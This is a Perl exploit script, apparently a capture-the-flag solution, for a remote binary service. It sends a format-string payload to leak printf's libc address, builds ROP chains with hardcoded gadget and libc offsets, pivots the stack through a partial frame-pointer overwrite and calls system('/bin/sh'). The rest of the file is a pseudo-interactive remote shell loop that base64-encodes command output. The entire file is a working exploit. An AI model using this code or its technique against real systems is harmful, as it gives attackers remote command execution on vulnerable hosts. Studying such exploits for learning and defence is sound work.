#!/usr/bin/perl

use strict;
use warnings;

use IO::Socket;
use MIME::Base64;

if (@ARGV != 2) {
	use File::Basename;
	my $name = basename($0, "");
	die "Usage: perl $name host port\n";
}

my $sock = new IO::Socket::INET(PeerAddr=>$ARGV[0], PeerPort=>int($ARGV[1]), Proto=>"tcp");
unless ($sock) { die "connection failed: $!\n"; }
binmode($sock);

my $data = <$sock>;
my $nameAddr = 0;
if ($data =~ /0x([0-9a-fA-F]+)/) {
	$nameAddr = hex($1);
} else {
	die "failed to get &Name\n";
}
print $data;

my $pop_rdi_addr = 0x4012f3;
my $ret_addr = 0x4012f4;
my $printf_exec_addr = 0x401080;
my $printf_addr_addr = 0x404020;
my $main_addr = 0x40125d;

my $printf_libc = 0x64e10;
my $system_libc = 0x55410;
my $str_bin_sh_libc = 0x1b75aa;

my $payload = "!!!!%7\$s!!!!\n\0";
$payload .= "\0" x (16 - length($payload) % 16);
my $retOffset = $nameAddr + length($payload);

$payload .= pack("Q", $pop_rdi_addr);
$payload .= pack("Q", $nameAddr);
$payload .= pack("Q", $printf_exec_addr);
$payload .= pack("Q", $ret_addr);
$payload .= pack("Q", $main_addr);
$payload .= pack("Q", $printf_addr_addr);

$payload .= "\0" x (256 - length($payload));
$payload .= pack("S", ($retOffset - 8) & 0xffff); # -8 for "pop rbp" in leave

print $sock $payload;

my $hello = <$sock>;
print $hello;
my $leak_data = <$sock>;
my @leaks = split(/!!!!/, $leak_data);
my $printf_mem_addr = unpack("Q", $leaks[1] . ("\0" x 8));

printf "printf = 0x%x\n", $printf_mem_addr;

my $data2 = <$sock>;
my $nameAddr2 = 0;
if ($data2 =~ /0x([0-9a-fA-F]+)/) {
	$nameAddr2 = hex($1);
} else {
	die "failed to get 2nd &Name\n";
}
print $data2;

my $payload2 = pack("Q", 0); # this will be feeded to rbp in leave
$payload2 .= pack("Q", $pop_rdi_addr);
$payload2 .= pack("Q", $str_bin_sh_libc + $printf_mem_addr - $printf_libc);
$payload2 .= pack("Q", $ret_addr);
$payload2 .= pack("Q", $system_libc + $printf_mem_addr - $printf_libc);

$payload2 .= "\0" x (256 - length($payload2));
$payload2 .= pack("S", $nameAddr2 & 0xffff);

print $sock $payload2;

print $sock "echo meow\n";

for (;;) {
	my $line = <$sock>;
	print $line;
	unless ($line) {
		print "connection error...\n";
		close($sock);
		exit 1;
	}
	chomp($line);
	if ($line =~ /meow\z/) {
		print "entering pseudo-interactive mode!\n";
		last;
	}
}

while (my $command = <STDIN>) {
	chomp($command);
	if ($command eq "") {
		# do nothing
	} elsif ($command eq "exit") {
		print $sock "exit\n";
		last;
	} else {
		print $sock "$command | base64 -w 999999999\n";
		my $resp = <$sock>;
		print decode_base64($resp);
	}
}

close($sock);
